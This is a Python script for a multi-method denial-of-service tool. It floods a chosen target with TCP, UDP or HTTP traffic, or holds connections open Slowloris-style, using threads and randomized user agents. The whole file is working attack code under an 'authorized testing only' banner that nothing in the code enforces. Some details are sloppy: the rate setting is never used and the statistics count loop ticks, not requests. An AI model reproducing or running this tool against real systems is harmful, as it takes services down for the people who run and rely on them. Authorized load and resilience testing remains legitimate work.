#!/usr/bin/env python3
"""
ADVANCED DoS TESTING TOOL - FOR AUTHORIZED SECURITY TESTING ONLY

Features:
- Configurable threats-per-second (TPS) rate
- Multiple attack vectors (TCP, UDP, HTTP, Slowloris)
- Randomized user agents
- Connection pooling
- Traffic obfuscation
"""

import socket
import threading
import random
import time
import sys
from argparse import ArgumentParser

class AdvancedDoSTester:
    def __init__(self, target, port, tps=100, duration=60, method='tcp'):
        self.target = target
        self.port = port
        self.tps = tps  # Threats per second
        self.duration = duration
        self.method = method
        self.running = False
        self.connections = []
        self.user_agents = self._load_user_agents()
        self.request_templates = self._load_request_templates()
        
    def _load_user_agents(self):
        """Load diverse user agents for HTTP attacks"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)',
            'Mozilla/5.0 (Linux; Android 12; SM-S901U)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'curl/7.68.0',
            'python-requests/2.26.0'
        ]
    
    def _load_request_templates(self):
        """Various HTTP request templates"""
        return [
            b'GET / HTTP/1.1\r\nHost: %s\r\n\r\n',
            b'POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 100\r\n\r\n',
            b'HEAD / HTTP/1.1\r\nHost: %s\r\n\r\n'
        ]
    
    def _create_socket(self):
        """Create and return a new socket"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if self.method in ['tcp', 'http', 'slowloris'] else socket.SOCK_DGRAM)
            s.settimeout(2)
            return s
        except Exception as e:
            print(f"Socket creation failed: {e}")
            return None
    
    def _tcp_flood(self):
        """High-performance TCP flood with connection pooling"""
        while self.running:
            try:
                s = self._create_socket()
                if s:
                    s.connect((self.target, self.port))
                    self.connections.append(s)
                    s.send(random.choice(self.request_templates) % self.target.encode())
            except:
                pass
    
    def _udp_flood(self):
        """UDP flood with random payloads"""
        while self.running:
            try:
                s = self._create_socket()
                if s:
                    payload = bytes(random.getrandbits(8) for _ in range(1024))
                    s.sendto(payload, (self.target, self.port))
                    s.close()
            except:
                pass
    
    def _http_flood(self):
        """HTTP flood with keep-alive connections"""
        while self.running:
            try:
                s = self._create_socket()
                if s:
                    s.connect((self.target, self.port))
                    for _ in range(10):  # Multiple requests per connection
                        headers = [
                            f'User-Agent: {random.choice(self.user_agents)}',
                            'Accept: text/html,application/xhtml+xml',
                            'Connection: keep-alive'
                        ]
                        request = b'GET /?' + str(random.randint(0, 10000)).encode() + b' HTTP/1.1\r\n'
                        request += b'Host: ' + self.target.encode() + b'\r\n'
                        request += b'\r\n'.join(h.encode() for h in headers) + b'\r\n\r\n'
                        s.send(request)
                        time.sleep(0.05)
                    s.close()
            except:
                pass
    
    def _slowloris(self):
        """Slowloris attack with partial headers"""
        while self.running:
            try:
                s = self._create_socket()
                if s:
                    s.connect((self.target, self.port))
                    s.send(b'GET / HTTP/1.1\r\n')
                    s.send(b'Host: ' + self.target.encode() + b'\r\n')
                    s.send(b'User-Agent: ' + random.choice(self.user_agents).encode() + b'\r\n')
                    
                    while self.running:
                        s.send(b'X-a: ' + str(random.randint(1, 5000)).encode() + b'\r\n')
                        time.sleep(15)
            except:
                if s:
                    s.close()
    
    def _stats_monitor(self):
        """Display real-time attack statistics"""
        start_time = time.time()
        request_count = 0
        
        while self.running:
            elapsed = time.time() - start_time
            if elapsed >= 1:
                current_tps = request_count / elapsed
                sys.stdout.write(f"\rTPS: {current_tps:.2f} | Duration: {elapsed:.2f}s | Method: {self.method} | Target: {self.target}:{self.port}")
                sys.stdout.flush()
                request_count = 0
                start_time = time.time()
            request_count += 1
            time.sleep(0.01)
    
    def start(self):
        """Start the load test with controlled TPS"""
        self.running = True
        attack_methods = {
            'tcp': self._tcp_flood,
            'udp': self._udp_flood,
            'http': self._http_flood,
            'slowloris': self._slowloris
        }
        
        if self.method not in attack_methods:
            print(f"Invalid method: {self.method}")
            return
        
        # Start stats monitor
        threading.Thread(target=self._stats_monitor, daemon=True).start()
        
        # Calculate delay between requests to achieve desired TPS
        delay = 1.0 / self.tps if self.tps > 0 else 0
        
        # Start attack threads
        threads = []
        for _ in range(min(100, self.tps)):  # Limit to 100 threads max
            t = threading.Thread(target=attack_methods[self.method])
            t.daemon = True
            threads.append(t)
            t.start()
        
        print(f"\nStarting attack on {self.target}:{self.port} at {self.tps} TPS ({self.method})")
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
    
    def stop(self):
        """Clean up and stop the attack"""
        self.running = False
        for conn in self.connections:
            try:
                conn.close()
            except:
                pass
        print("\nAttack stopped. Cleaning up...")

if __name__ == '__main__':
    parser = ArgumentParser(description='ADVANCED DoS TESTING TOOL - FOR AUTHORIZED USE ONLY')
    parser.add_argument('target', help='Target IP or domain')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    parser.add_argument('-t', '--tps', type=int, default=100, help='Threats per second')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('-m', '--method', choices=['tcp', 'udp', 'http', 'slowloris'], default='tcp', help='Attack method')
    
    args = parser.parse_args()
    
    print("""
    WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY.
    Unauthorized use is illegal and unethical.
    By proceeding, you confirm you have proper authorization.
    """)
    
    tester = AdvancedDoSTester(args.target, args.port, args.tps, args.duration, args.method)
    try:
        tester.start()
    except KeyboardInterrupt:
        tester.stop()